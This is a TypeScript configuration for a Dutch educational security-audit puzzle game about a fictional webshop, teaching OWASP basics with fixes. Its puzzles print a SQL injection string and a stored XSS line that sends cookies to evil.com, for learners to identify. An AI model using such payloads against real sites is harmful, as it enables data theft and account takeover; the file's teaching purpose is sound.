import type { PuzzleLabConfig } from '../puzzleLabTypes';

const config: PuzzleLabConfig = {
    missionId: 'security-auditor',
    title: 'Security Auditor',
    introEmoji: '🛡️',
    introTitle: 'Security Auditor',
    introDescription:
        'De webshop van FreshDrop gaat morgen live — maar de eigenaar maakt zich zorgen over de beveiliging. Jij bent ingeschakeld als junior security auditor. Vind de kwetsbaarheden voordat een hacker dat doet. Ethisch hacken: beschermen, niet breken.',
    experienceDesign: {
        boringRisk: 'low',
        firstTenSeconds: 'Kies je auditspoor: OWASP-finding, ernstclassificatie of professioneel rapport.',
        primaryInteraction: 'solve-puzzle',
        feedbackMoment: 'Feedback koppelt elke finding aan bescherming en herstel, niet aan aanvalssensatie.',
        visualKit: 'review-puzzle-feedback',
        evidenceMoment: 'Je bewijs bestaat uit kwetsbaarheidsherkenning, ernstclassificatie en een verdedigingsrapport.',
        antiBoringRule: 'Security-audit blijft ethisch en herstelgericht: beschermen, niet breken.',
        chromeAcceptance: 'Eerste routekeuze en safe-recovery panel tonen de beschermende auditrol zonder fear-based visuals.',
    },
    introFeatures: [
        'Controleer een website op de meest voorkomende kwetsbaarheden',
        'Leer de OWASP Top 10 kennen op een begrijpelijk niveau',
        'Classificeer kwetsbaarheden op ernst (laag tot kritiek)',
        'Schrijf een professioneel beveiligingsrapport met aanbevelingen',
    ],
    maxScore: 100,
    puzzles: [
        {
            id: 'owasp-herkennen',
            title: 'Welke kwetsbaarheid is dit?',
            type: 'code-crack',
            description:
                'Je test het zoekformulier van FreshDrop. In het zoekveld staat deze invoer:\n\n```\n\' OR \'1\'=\'1\n```\n\nDe webshop geeft plotseling de volledige klantendatabase terug: namen, e-mails en adressen van alle klanten.\n\nTyp de naam van de kwetsbaarheid die je hebt ontdekt.',
            clues: [
                'De website stuurt je invoer rechtstreeks naar de database zonder het te controleren.',
                'De invoer breekt de database-query: \' sluit een tekstveld af, OR \'1\'=\'1 is altijd waar.',
                'Dit staat op nummer 1 van de OWASP Top 10 — de lijst van meest kritieke webkwetsbaarheden.',
            ],
            extraClues: [
                'SQL-injectie werkt doordat gebruikersinvoer wordt samengevoegd met een database-opdracht, in plaats van gescheiden te worden verwerkt.',
                'Oplossing: gebruik "prepared statements" of "parameterized queries" — dan kan invoer nooit worden verward met database-code.',
            ],
            revealExtraAfterAttempts: 2,
            answer: ['sql-injectie', 'sql injectie'],
            validator: (input: string) => input.toLowerCase().includes('sql') && input.toLowerCase().includes('inject'),
            caseSensitive: false,
            maxAttempts: 3,
            points: 25,
            successMessage:
                'Goed gevonden! Dit is SQL-injectie — nummer 1 op de OWASP Top 10. De invoer "\' OR \'1\'=\'1" manipuleert de database-query zodat alle records worden teruggegeven. Dit is een kritieke kwetsbaarheid: aanvallers kunnen hiermee de hele database lezen, aanpassen of verwijderen.',
            hintCost: 4,
        },
        {
            id: 'ernst-classificatie',
            title: 'Classificeer de kwetsbaarheden',
            type: 'text-input',
            description:
                'Je hebt 3 kwetsbaarheden gevonden bij FreshDrop:\n\n**A.** De website heeft geen HTTPS — alle data, inclusief wachtwoorden, wordt onversleuteld verstuurd.\n**B.** De foutmeldingen tonen interne server-informatie: databaseversie en bestandspaden.\n**C.** De "over ons"-pagina heeft een typefout in de tekst.\n\nTyp welke finding de hoogste ernst heeft en waarom. Begin met A, B of C.',
            clues: [
                'Ernst hangt af van de impact als een aanvaller misbruik maakt.',
                'Onversleuteld verkeer betekent dat iedereen op hetzelfde netwerk mee kan lezen — ook wachtwoorden.',
                'Interne serverinfo helpt een aanvaller, maar vereist al gedeeltelijke toegang tot de site.',
            ],
            extraClues: [
                'Classificatieschaal: Kritiek (directe grote schade) > Hoog (serieuze impact) > Midden (beperkte impact) > Laag (weinig direct risico).',
                'Geen HTTPS is "Kritiek" op een webshop: creditcardnummers en inloggegevens reizen onbeveiligd over het netwerk.',
            ],
            revealExtraAfterAttempts: 2,
            answer: [],
            validator: (input: string) => {
                const s = input.toLowerCase();
                return (s.trim().startsWith('a') || s.includes('https')) && (s.includes('onversleuteld') || s.includes('wachtwoord') || s.includes('data'));
            },
            caseSensitive: false,
            maxAttempts: 3,
            points: 25,
            successMessage:
                'Correct! Geen HTTPS is kritiek op een webshop. Wachtwoorden, adressen en betalingsdata worden letterlijk als leesbare tekst verstuurd — iedereen op het netwerk (koffiezaak, school) kan meelezen. B is hoog maar vereist al toegang. C is geen beveiligingsprobleem.',
            hintCost: 4,
        },
        {
            id: 'xss-scenario',
            title: 'Wat is het risico van dit script?',
            type: 'code-crack',
            description:
                'Je test de beoordelingen-sectie van FreshDrop. Een review bevat dit script:\n\n```html\n<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>\n```\n\nDe webshop slaat de recensie op en toont hem aan alle bezoekers. Wanneer iemand de pagina bezoekt, wordt het script uitgevoerd.\n\nTyp het risico in je eigen woorden: wat kan hiermee worden gestolen of overgenomen?',
            clues: [
                'Het script wordt uitgevoerd IN de browser van de bezoeker — op de echte FreshDrop-pagina.',
                'document.cookie bevat de sessiecookies van de ingelogde bezoeker.',
                'De aanvaller stuurt die cookies naar zijn eigen server (evil.com).',
            ],
            extraClues: [
                'Dit heet Stored XSS (Cross-Site Scripting) — het kwaadaardige script wordt opgeslagen en uitgevoerd bij elke bezoeker.',
                'Met gestolen sessiecookies kan de aanvaller inloggen alsof hij de bezoeker is — zonder wachtwoord nodig te hebben.',
            ],
            revealExtraAfterAttempts: 2,
            answer: [],
            validator: (input: string) => {
                const s = input.toLowerCase();
                return (s.includes('cookie') || s.includes('sessie')) && (s.includes('account') || s.includes('overnemen') || s.includes('stelen'));
            },
            caseSensitive: false,
            maxAttempts: 3,
            points: 25,
            successMessage:
                'Juist! Dit is Stored XSS — een aanval die elke bezoeker van de pagina treft. Met gestolen sessiecookies kan de aanvaller accounts overnemen zonder wachtwoord. Oplossing: sanitizeer alle gebruikersinvoer en gebruik een Content Security Policy (CSP) header.',
            hintCost: 4,
        },
        {
            id: 'rapport-schrijven',
            title: 'Schrijf een aanbeveling in het rapport',
            type: 'text-input',
            description:
                'Het beveiligingsrapport is bijna klaar. Schrijf een concrete aanbeveling voor FreshDrop over de SQL-injectie-kwetsbaarheid.\n\nEen goede aanbeveling bevat:\n• Wat er mis is (kort)\n• De concrete oplossing\n• Waarom dat helpt\n\nHet hoeft geen lang verhaal te zijn — 1 à 3 zinnen zijn prima.',
            clues: [
                'SQL-injectie wordt veroorzaakt doordat invoer direct wordt samengevoegd met database-code.',
                'De technische oplossing heet "prepared statements" of "parameterized queries".',
                'Noem ook waarom het helpt: invoer wordt dan nooit als code behandeld.',
            ],
            extraClues: [
                'Voorbeeld: "Het zoekformulier is kwetsbaar voor SQL-injectie omdat invoer direct in queries wordt gebruikt. Gebruik prepared statements, zodat gebruikersinvoer altijd als data wordt behandeld en nooit als code."',
            ],
            revealExtraAfterAttempts: 3,
            answer: [],
            validator: (input: string) => {
                const s = input.toLowerCase();
                const hasProblem = s.includes('sql') || s.includes('injectie') || s.includes('kwetsbaarheid') || s.includes('formulier') || s.includes('invoer');
                const hasSolution = s.includes('prepared') || s.includes('parameterized') || s.includes('sanitiz') || s.includes('valideer') || s.includes('escape') || s.includes('queries');
                return hasProblem && hasSolution && s.length >= 30;
            },
            caseSensitive: false,
            maxAttempts: 8,
            points: 25,
            successMessage:
                'Uitstekend rapport! Een goede beveiligingsaanbeveling is concreet en actionable — niet "maak het veiliger" maar "gebruik prepared statements". Zo weet de ontwikkelaar precies wat te doen. Dit is hoe professionele penetratietesters werken: kwetsbaarheid vinden, impact beschrijven, oplossing geven.',
            hintCost: 3,
        },
    ],
    badges: [
        {
            minScore: 90,
            emoji: '🏆',
            title: 'Senior Security Auditor',
            color: '#D7C95F',
        },
        {
            minScore: 70,
            emoji: '🛡️',
            title: 'Ethisch Hacker',
            color: '#445865',
        },
        {
            minScore: 40,
            emoji: '🔍',
            title: 'Junior Auditor',
            color: '#5F947D',
        },
        {
            minScore: 0,
            emoji: '📋',
            title: 'Stagiair Security',
            color: '#0B453F',
        },
    ],
    takeaways: [
        'SQL-injectie (OWASP #1): door gebruikersinvoer nooit direct in database-queries te gebruiken maar altijd prepared statements in te zetten, is dit te voorkomen.',
        'Ernst-classificatie bepaalt prioriteit: kritieke kwetsbaarheden (geen HTTPS, SQL-injectie) gaan altijd vóór lage bevindingen.',
        'XSS (Cross-Site Scripting): kwaadaardige scripts in gebruikersinvoer moeten worden gesanitizeerd — anders worden ze door elke bezoeker uitgevoerd.',
        'Ethisch hacken = toestemming + verantwoordelijkheid: kwetsbaarheden rapporteren om te beschermen, niet om te misbruiken.',
        'Een goed beveiligingsrapport is actionable: probleem, impact en concrete technische oplossing — zodat de developer direct kan handelen.',
    ],
};

export default config;
